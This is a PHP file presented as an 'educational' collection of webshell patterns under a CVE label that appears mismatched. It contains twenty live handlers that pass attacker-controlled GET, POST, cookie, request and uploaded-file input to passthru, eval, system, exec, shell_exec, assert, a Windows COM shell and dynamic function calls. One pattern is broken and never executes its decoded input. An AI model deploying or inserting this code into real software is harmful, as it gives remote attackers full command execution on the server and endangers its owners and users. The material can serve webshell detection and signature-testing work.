<?php
// CVE-2021-41769: PHP Webshell
// This file contains multiple webshell patterns for educational purposes

// Pattern 1: Basic command execution
if(isset($_GET['cmd'])) {
    passthru($_GET['cmd']);
}

// Pattern 2: Eval execution
if(isset($_POST['code'])) {
    eval($_POST['code']);
}

// Pattern 3: System command execution
if(isset($_REQUEST['exec'])) {
    system($_REQUEST['exec']);
}

// Pattern 4: Shell execution
if(isset($_GET['shell'])) {
    exec("/bin/sh -c " . $_GET['shell']);
}

// Pattern 5: Windows command execution
if(isset($_POST['win_cmd'])) {
    $shell = new COM("WScript.Shell");
    $shell->Run($_POST['win_cmd'], 0, true);
}

// Pattern 6: Base64 encoded execution
if(isset($_GET['b64'])) {
    $decoded = base64_decode($_GET['b64']);
    gzuncompress($decoded);
}

// Pattern 7: Dynamic function call
if(isset($_GET['func'])) {
    $_GET['func']($_GET['arg']);
}

// Pattern 8: Reflection based execution
if(isset($_POST['reflection'])) {
    $ref = new ReflectionFunction($_POST['reflection']);
    $ref->invoke($_POST['args']);
}

// Pattern 9: Hex encoded execution
if(isset($_GET['hex'])) {
    $cmd = pack("H*", "65786563"); // "exec" in hex
    $cmd($_GET['hex']);
}

// Pattern 10: Dynamic variable function call
if(isset($_GET['method'])) {
    $method = $_GET['method'];
    $method($_GET['param']);
}

// Pattern 11: Cookie based execution
if(isset($_COOKIE['cmd'])) {
    $cmd = $_COOKIE['cmd'];
    $cmd();
}

// Pattern 12: Request based execution
if(isset($_REQUEST['action'])) {
    $_REQUEST['action']($_REQUEST['param']);
}

// Pattern 13: Hidden command execution
if(isset($_GET['b4tm4n'])) {
    shell_exec($_GET['b4tm4n']);
}

// Pattern 14: Alternative shell execution
if(isset($_GET['cmdshell'])) {
    system($_GET['cmdshell']);
}

// Pattern 15: PHP info disclosure
if(isset($_GET['info'])) {
    phpinfo();
}

// Pattern 16: Assert based execution
if(isset($_POST['assert'])) {
    assert($_POST['assert']);
}

// Pattern 17: Call user function execution
if(isset($_GET['call'])) {
    call_user_func($_GET['call'], $_GET['args']);
}

// Pattern 18: Call user function array execution
if(isset($_POST['call_array'])) {
    call_user_func_array($_POST['call_array'], $_POST['args']);
}

// Pattern 19: Combined execution methods
if(isset($_GET['combined'])) {
    $cmd = base64_decode($_GET['combined']);
    eval($cmd);
}

// Pattern 20: File upload and execution
if(isset($_FILES['file'])) {
    $content = file_get_contents($_FILES['file']['tmp_name']);
    eval($content);
}
?> 